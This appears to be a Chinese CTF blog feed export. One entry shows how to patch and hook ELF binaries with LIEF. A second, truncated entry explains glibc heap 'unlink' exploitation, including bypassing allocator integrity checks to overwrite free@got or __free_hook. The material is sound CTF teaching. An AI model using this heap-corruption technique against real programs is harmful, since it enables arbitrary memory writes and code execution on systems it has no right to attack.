        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    记录LIEF在CTF中打patch的常用函数，更多详细参考官方文档。 <a href="https://lief.quarkslab.com/doc/latest/api/python/elf.html#parser" target="_blank" rel="noopener">链接</a>，此处记录在CTF方面的应用详细。LIEF不仅仅用于ELF文件的修改，还可以在PE，Mach-o，Android等方面都有应用。按照官方文档的说明，LIEF的目的是提供一个跨平台的库，可以解析，修改和抽象ELF，PE，MachO和Android格式，目前支持的格式有<code>ELF</code>, <code>PE</code>, <code>MachO</code>, <code>DEX</code>, <code>OAT</code>, <code>ART</code> and <code>VDEX</code>。</p><p>在CTF中linux的ELF应用中在于在机器语言级别修改binary的漏洞（patch），下面将介绍常用的LIEF的函数使用，围绕函数API展开接收该函数接收的参数、返回结果、应用代码。</p><a id="more"></a><h3 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h3><h4 id="LIEF的体系架构"><a href="#LIEF的体系架构" class="headerlink" title="LIEF的体系架构"></a>LIEF的体系架构</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/archi.png" alt="archi"></p><p>一个paser把参数目标文件按照对应文件格式进行解释，并提供API对其进行查询，修改。</p><h4 id="Linux下ELF文件格式基础"><a href="#Linux下ELF文件格式基础" class="headerlink" title="Linux下ELF文件格式基础"></a>Linux下ELF文件格式基础</h4><p>LIEF的编程对应了ELF的文件格式，paser的解释相当于一个readelf的过程，返回一个Binary对象（object）。在CTF的patch中是以链接视角对目标文件进行修改，有关于目标文件格式的链接视角与加载视角可以参阅《程序员的自我修养》，在这里只需知道链接(编译)视角用到的是.section（节），而加载(运行)视角用的是.segment（段），如在binary中hook一个函数就用到增加binary.add(segment)，即只使用Binary对象中方法add的一个实现。下面是常用的函数与对象</p><ol><li><p>parser</p><p> 通常是便写lief脚本patch的开始，parse对ELF按格式解释，返回一个Bianry对象，Binary对象存在函数返回Section、Segment对象。</p></li><li><p>Binary对象</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true"># binary = lief.parse("./vul")</span> <span class="token keyword">class</span> <span class="token class-name">lief</span><span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Binary <span class="token comment" spellcheck="true"># 常用方法</span> <span class="token number">1.</span>add<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> segment<span class="token punctuation">:</span> LIEF<span class="token punctuation">:</span><span class="token punctuation">:</span>ELF<span class="token punctuation">:</span><span class="token punctuation">:</span>Segment<span class="token punctuation">,</span> base<span class="token punctuation">:</span> int<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> LIEF<span class="token punctuation">:</span><span class="token punctuation">:</span>ELF<span class="token punctuation">:</span><span class="token punctuation">:</span>Segment     Add a segment <span class="token keyword">in</span> the binary（patch usually add segment） <span class="token number">2.</span>get_symbol<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> symbol_name<span class="token punctuation">:</span> str<span class="token punctuation">)</span> → LIEF<span class="token punctuation">:</span><span class="token punctuation">:</span>Symbol     Return the Symbol <span class="token keyword">with</span> the given name <span class="token number">3.</span>get_section<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> section_name<span class="token punctuation">:</span> str<span class="token punctuation">)</span> → LIEF<span class="token punctuation">:</span><span class="token punctuation">:</span>ELF<span class="token punctuation">:</span><span class="token punctuation">:</span>Section     Return the Section <span class="token keyword">with</span> the given name <span class="token number">4.</span>patch_address<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> address<span class="token punctuation">:</span> int<span class="token punctuation">,</span> patch_value<span class="token punctuation">:</span> List<span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">,</span> va_type<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>Binary<span class="token punctuation">.</span>VA_TYPES<span class="token operator">=</span>VA_TYPES<span class="token punctuation">.</span>AUTO<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None     Virtual address <span class="token keyword">is</span> specified <span class="token keyword">in</span> the first argument <span class="token operator">and</span> the content <span class="token keyword">in</span> the second <span class="token punctuation">(</span><span class="token keyword">as</span> a list of bytes<span class="token punctuation">)</span><span class="token punctuation">.</span> If the underlying binary <span class="token keyword">is</span> a PE<span class="token punctuation">,</span> one can specify <span class="token keyword">if</span> the virtual address <span class="token keyword">is</span> a RVA <span class="token operator">or</span> a VA<span class="token punctuation">.</span> By default it <span class="token keyword">is</span> set to AUTO <span class="token number">5.</span>patch_pltgot<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> symbol_name<span class="token punctuation">:</span> str<span class="token punctuation">,</span> address<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None     Patch the imported symbol’s name <span class="token keyword">with</span> the address <span class="token number">6.</span>write<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Binary<span class="token punctuation">,</span> output<span class="token punctuation">:</span> str<span class="token punctuation">)</span> → None     Rebuild the binary <span class="token operator">and</span> write it <span class="token keyword">in</span> a file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Segment对象</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token keyword">class</span> <span class="token class-name">lief</span><span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Segment property content     Segment’s raw data property virtual_address     Address where the segment will be mapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Section对象</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token keyword">class</span> <span class="token class-name">lief</span><span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Section property content     section raw content property name     section name property virtual_address     Return address where the section will be mapped <span class="token keyword">in</span> memory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Symbol对象</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token keyword">class</span> <span class="token class-name">lief</span><span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span>self<span class="token punctuation">:</span> lief<span class="token punctuation">.</span>ELF<span class="token punctuation">.</span>Symbol<span class="token punctuation">)</span>  property name     symbol name property value     This member have slightly different interpretations     In relocatable files<span class="token punctuation">,</span> value holds alignment constraints <span class="token keyword">for</span> a symbol whose section index <span class="token keyword">is</span> SHN_COMMON<span class="token punctuation">.</span>     In relocatable files<span class="token punctuation">,</span> value holds a section offset <span class="token keyword">for</span> a defined symbol<span class="token punctuation">.</span> That <span class="token keyword">is</span><span class="token punctuation">,</span> value <span class="token keyword">is</span> an offset <span class="token keyword">from</span> the beginning of the section associated <span class="token keyword">with</span> this symbol<span class="token punctuation">.</span>     In executable <span class="token operator">and</span> shared object files<span class="token punctuation">,</span> value holds a virtual address<span class="token punctuation">.</span> To make these files’ssymbols more useful <span class="token keyword">for</span> the dynamic linker<span class="token punctuation">,</span> the section offset <span class="token punctuation">(</span>file interpretation<span class="token punctuation">)</span> gives way to a virtual address <span class="token punctuation">(</span>memory interpretation<span class="token punctuation">)</span> <span class="token keyword">for</span> which the section number <span class="token keyword">is</span> irrelevant<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="dmeo准备"><a href="#dmeo准备" class="headerlink" title="dmeo准备"></a>dmeo准备</h4><ol><li><p>源码文件</p><pre class="line-numbers language-C"><code class="language-C"> #include<stdio.h> int main(){     printf("hello world\n");     puts("test of lief");     printf("hhhhhh");     return 0; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 编译成二进制文件</p><pre class="line-numbers language-shell"><code class="language-shell"> gcc -o vulner vulner.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编译hook</p><p> 通过手写A&amp;T格式的汇编指令文件，实现对vulner中函数的逻辑修改，包括重写函数，添加逻辑处理等。编译成位置无关的无其他库函数链接的第三方patch二进制文件。</p><ul><li><p>对于call、jmp的指令地址跳转根据生成的指令长度使用nop进行占位，如call指令占5 bytes,对于jmp有近跳转、短跳转、远跳转之分，通常是2bytes或者5bytes。</p></li><li><p>汇编指令的编写要符合A&amp;T格式要求：如立即数不能直接赋值段寄存器等。</p><pre class="line-numbers language-C"><code class="language-C">void myprintf(){  asm(      "mov $0xa6e75736e6f6874,%rsi\n"      "mov $0x0,%rdi\n"      "mov $0x8,%rdx\n"      "mov $0x1,%rax\n"      "syscall"  );}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译：</p><pre class="line-numbers language-shell"><code class="language-shell">gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><h4 id="通过增加segment进行patch"><a href="#通过增加segment进行patch" class="headerlink" title="通过增加segment进行patch"></a>通过增加segment进行patch</h4><h5 id="hook指定地址函数调用"><a href="#hook指定地址函数调用" class="headerlink" title="hook指定地址函数调用"></a>hook指定地址函数调用</h5><p>对原binary中一个call func进行修改，改变该call func的行为（只改变这次的调用，后面其他的call func没有被改变，因为只指定这次地址处的函数修改hook）</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> lief<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">patch_call</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>srcaddr<span class="token punctuation">,</span>dstaddr<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>dstaddr<span class="token punctuation">)</span>    length <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>dstaddr <span class="token operator">-</span> <span class="token punctuation">(</span>srcaddr <span class="token operator">+</span> <span class="token number">5</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># dst-(src+5)的一个补码call形式</span>    order <span class="token operator">=</span> <span class="token string">'\xe8'</span><span class="token operator">+</span>length    <span class="token keyword">print</span> disasm<span class="token punctuation">(</span>order<span class="token punctuation">,</span>arch<span class="token operator">=</span>arch<span class="token punctuation">)</span>    file<span class="token punctuation">.</span>patch_address<span class="token punctuation">(</span>srcaddr<span class="token punctuation">,</span><span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> order<span class="token punctuation">]</span><span class="token punctuation">)</span>binary <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">"./vulner"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># gcc -o vulner vulner.c</span>hook <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'./hook'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><span class="token comment" spellcheck="true"># inject hook program to binary</span>segment_added  <span class="token operator">=</span> binary<span class="token punctuation">.</span>add<span class="token punctuation">(</span>hook<span class="token punctuation">.</span>segments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>hook_fun      <span class="token operator">=</span> hook<span class="token punctuation">.</span>get_symbol<span class="token punctuation">(</span><span class="token string">"myprintf"</span><span class="token punctuation">)</span>dstaddr <span class="token operator">=</span> segment_added<span class="token punctuation">.</span>virtual_address <span class="token operator">+</span> hook_fun<span class="token punctuation">.</span>value <span class="token comment" spellcheck="true"># 计算添加后该函数在binary的地址（相当于一个reloacation过程）</span>srcaddr <span class="token operator">=</span> <span class="token number">0x40056f</span> <span class="token comment" spellcheck="true"># 指定修改的地址</span>patch_call<span class="token punctuation">(</span>binary<span class="token punctuation">,</span>srcaddr<span class="token punctuation">,</span>dstaddr<span class="token punctuation">)</span>binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'vulner.patched'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook全部该函数的调用"><a href="#hook全部该函数的调用" class="headerlink" title="hook全部该函数的调用"></a>hook全部该函数的调用</h5><p>对原binary的全部调用函数进行修改，即通过改写plt的地址</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> liefbinary <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">"./vulner"</span><span class="token punctuation">)</span>hook <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'./hook'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># inject hook program to binary</span>segment_added  <span class="token operator">=</span> binary<span class="token punctuation">.</span>add<span class="token punctuation">(</span>hook<span class="token punctuation">.</span>segments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># hook got</span>my_printf      <span class="token operator">=</span> hook<span class="token punctuation">.</span>get_symbol<span class="token punctuation">(</span><span class="token string">"myprintf"</span><span class="token punctuation">)</span>my_printf_addr <span class="token operator">=</span> segment_added<span class="token punctuation">.</span>virtual_address <span class="token operator">+</span> my_printf<span class="token punctuation">.</span>value <span class="token comment" spellcheck="true"># 加段后映射的基址 + 函数的偏移</span>binary<span class="token punctuation">.</span>patch_pltgot<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">,</span> my_printf_addr<span class="token punctuation">)</span>binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'vulner_patch_plt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过改写eh-frame段内容"><a href="#通过改写eh-frame段内容" class="headerlink" title="通过改写eh_frame段内容"></a>通过改写eh_frame段内容</h4><p>上面通过增加section使得binary的变化很大，我们可以通过把代码写入eh_frame中（覆盖其原来的内容）可以实现binary大小基本没有变化。有关于.eh_frame的作用 <a href="https://stackoverflow.com/questions/26300819/why-gcc-compiled-c-program-needs-eh-frame-section" target="_blank" rel="noopener">详情</a>，这里只需知道若存在该段，我们能够进行改写并无影响。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> lief<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">patch_call</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>srcaddr<span class="token punctuation">,</span>dstaddr<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>dstaddr<span class="token punctuation">)</span>    length <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>dstaddr <span class="token operator">-</span> <span class="token punctuation">(</span>srcaddr <span class="token operator">+</span> <span class="token number">5</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>    order <span class="token operator">=</span> <span class="token string">'\xe8'</span><span class="token operator">+</span>length    <span class="token keyword">print</span> disasm<span class="token punctuation">(</span>order<span class="token punctuation">,</span>arch<span class="token operator">=</span>arch<span class="token punctuation">)</span>    file<span class="token punctuation">.</span>patch_address<span class="token punctuation">(</span>srcaddr<span class="token punctuation">,</span><span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> order<span class="token punctuation">]</span><span class="token punctuation">)</span>binary <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">"./vulner"</span><span class="token punctuation">)</span>hook <span class="token operator">=</span> lief<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token string">'./hook'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write hook's .text content to binary's .eh_frame content </span>sec_ehrame <span class="token operator">=</span> binary<span class="token punctuation">.</span>get_section<span class="token punctuation">(</span><span class="token string">'.eh_frame'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sec_ehrame<span class="token punctuation">.</span>contentsec_text <span class="token operator">=</span> hook<span class="token punctuation">.</span>get_section<span class="token punctuation">(</span><span class="token string">'.text'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sec_text<span class="token punctuation">.</span>contentsec_ehrame<span class="token punctuation">.</span>content <span class="token operator">=</span> sec_text<span class="token punctuation">.</span>content<span class="token keyword">print</span> binary<span class="token punctuation">.</span>get_section<span class="token punctuation">(</span><span class="token string">'.eh_frame'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token comment" spellcheck="true"># hook target call</span>dstaddr <span class="token operator">=</span> sec_ehrame<span class="token punctuation">.</span>virtual_addresssrcaddr <span class="token operator">=</span> <span class="token number">0x400584</span>patch_call<span class="token punctuation">(</span>binary<span class="token punctuation">,</span>srcaddr<span class="token punctuation">,</span>dstaddr<span class="token punctuation">)</span>binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'vulner_patched_ehframe'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述对vuler的修改运行如图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564725589944.png" alt="1564725589944"></p><p>三者对原来binary的改动变化：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564725664221.png" alt="1564725664221"></p><p>可以看到对原有的.eh_frame的修改改动最小。（通常CTF中大小不变，此处是因为hook.c编写的是一个函数，.text段内容包括初始化等代码，大小超过了vulner的.eh_frame，所以变大，但是我们可以不用写一个my_printf函数直接在hook.c写asm()那部分是通常的修改.eh_frame的做法。）</p><h3 id="补充：Reloacation-file-与-Executable-file、Shared-Object-File的区别"><a href="#补充：Reloacation-file-与-Executable-file、Shared-Object-File的区别" class="headerlink" title="补充：Reloacation file 与 Executable file、Shared Object File的区别"></a>补充：Reloacation file 与 Executable file、Shared Object File的区别</h3><pre><code>The file header Type field tells us what the purpose of the file is. There are a few common file types.(readelf -h binary)CORE (value 4)DYN (Shared object file), for libraries (value 3)EXEC (Executable file), for binaries (value 2)REL (Relocatable file), before linked into an executable file (value 1)</code></pre><blockquote><p>Relocation entries for different object files have slightly different interpretations for the <code>r_offset</code>member.</p><ul><li>In relocatable files, <code>r_offset</code> holds a section offset. That is, the relocation section itself describes how to modify another section in the file; relocation offsets designate a storage unit within the second section.</li><li>In executable and shared object files, <code>r_offset</code> holds a virtual address. To make these files’ relocation entries more useful for the dynamic linker, the section offset (file interpretation) gives way to a virtual address (memory interpretation).</li></ul></blockquote><p>Relocatable files are still fully relocatable, whereas shared objects are one step further along the linking process and have been largely relocated. Shared objects are only relocatable if their code is position-independent (<em>e.g.</em> it was built with GCC’s <code>-fPIC</code> option).</p><ol><li><p>Relocatalbe file是只编译还没有链接的文件： <code>gcc -c -o xxx xxx.c</code></p><p> 里面的符号只是对应一个section基址的offset</p></li><li><p>Executable file是经过编译、链接的文件，里面的符号（变量、函数）是经过重定位之后的虚拟内存地址</p></li><li><p>Shared object file只有编译时带 -PIC的选项才保存的是一个对应一个section基址的offset</p></li></ol><p>这就可以解释在LIEF给elf binary(executable file)增加一个段之后，call funtion_address的函数地址计算</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink利用介绍</title>
      <link href="/2019/07/25/unlink-li-yong-jie-shao/"/>
      <url>/2019/07/25/unlink-li-yong-jie-shao/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    记录当下加入检查机制的unlink宏一般利用思想，主要在glibc pwn下的unlink利用手法。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="unlink的工作"><a href="#unlink的工作" class="headerlink" title="unlink的工作"></a>unlink的工作</h4><p>unlink(AV, P, BK, FD)：P是在空闲双向链表中的freed chunk(如small bins,larged bins,unsorted bins)</p><ol><li><p>在free检查前后是否可以合并的时候，对free(ptr) ptr前后相邻的chunk就是unlink的目标p（即把它从freed chunk链表卸下的一步工作）;</p></li><li><p>在malloc检查到size符合small bin等(只有fast bin用fd的单向链表，LIFO的分配管理)，分配chunk 从freed chunk 双向链表拿下</p> <a id="more"></a></li></ol><h4 id="没有检查机制的unlink"><a href="#没有检查机制的unlink" class="headerlink" title="没有检查机制的unlink"></a>没有检查机制的unlink</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> unlink(AV, P, BK, FD) {                                            </span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                          BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>    BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于没有检查的机制，对于任意伪造的fake freed chunk（构造user data中的fd,bk指针即可达到对任意地址pointer写机器字长（4bytes | 8 bytes）的数据，常见覆写free@got,free_hook函数等）</p><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12（FD,BK的角色可以调换）</li></ul><p>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。但在expect value +8 的地址处已经被改变，这需要我们绕过。重要的是，当前的unlink已经加入了检查的机制</p><h4 id="带有检查机制的unlink"><a href="#带有检查机制的unlink" class="headerlink" title="带有检查机制的unlink"></a>带有检查机制的unlink</h4><p>前面介绍的unlink思想还在，但需要我绕过当前加入的检查代码</p><pre class="line-numbers language-C"><code class="language-C">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \      malloc_printerr ("corrupted size vs. prev_size");               \// 检查 fd 和 bk 指针(双向链表完整性检查)if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \  // largebin 中 next_size 双向链表完整性检查               if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \              malloc_printerr (check_action,                                      \                               "corrupted double-linked list (not small)",    \                               P, AV);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>对于 <code>__builtin_expect (chunksize(P) != prev_size (next_chunk(P)</code> 的检查绕过：</p><p> 对一个free掉的chunk（p = malloc(0x80),p返回的是指向chunk的user data开始的指针，chunk包含chunk header域，即p = mem,free(p)== free(mem),内有mem与chunk的指针转换）有两处记录chunk的大小，一是自己chunk header的size，二是逻辑虚拟内存相连的chunk的pre_size域（不管该下一chunk是否in_use）。绕过该检查容易，因为能够通过溢出伪造fake chunk,也能把该fake chunk下一块的pre_size改掉。</p></li><li><p>对于<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>的检查绕过：</p><p> 要注意到的是，此处的FD-&gt;bk、BK-&gt;fd和P都是chunk ptr，（这也是前面提出的chunk与mem的区别），我们只需要找到一处内存（<code>ptr</code>）内容（<code>*ptr</code>）为P(P是我们可控的malloc返回的mem pointer),即可绕过该检查</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token comment" spellcheck="true">//tr指向的内存保存内容 = p = malloc(),即记录了分配的内存mem指针。</span> <span class="token comment" spellcheck="true">//对于32位平台</span> FD <span class="token operator">=</span> p<span class="token operator">-></span>fd <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token number">-0xc</span> BK <span class="token operator">=</span> p<span class="token operator">-></span>bk <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token number">-0x8</span> FD<span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> p BK<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token comment" spellcheck="true">//结构体的指针操作，->为一个取ptr内存保存值的操作</span> <span class="token comment" spellcheck="true">//即可绕过检查</span> <span class="token comment" spellcheck="true">//此处改写的内存为</span> FD<span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">=</span> BK <span class="token operator">=</span> ptr<span class="token number">-0x8</span> BK<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">=</span> FD <span class="token operator">=</span> ptr <span class="token operator">-</span><span class="token number">0xc</span> <span class="token comment" spellcheck="true">//即把原本保存malloc返回值的数组变量改为了对ptr-0xc的内容，即我们获得了改全局数组的改写权（因为后面的程序其他chunk的使用也是通过该全局数组内malloc返回的mem指针进行引用）,相当于我们获得了自定义malloc分配的内存地址，因为我们有改写的指针引用，进而可以对任意地址内存写，如覆写free@got,__free_hook等</span> <span class="token comment" spellcheck="true">//后面可以通过对chunk1改为对free@got的引用，对chunk1的写就是对free@got的写</span> <span class="token function">set_chunk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token 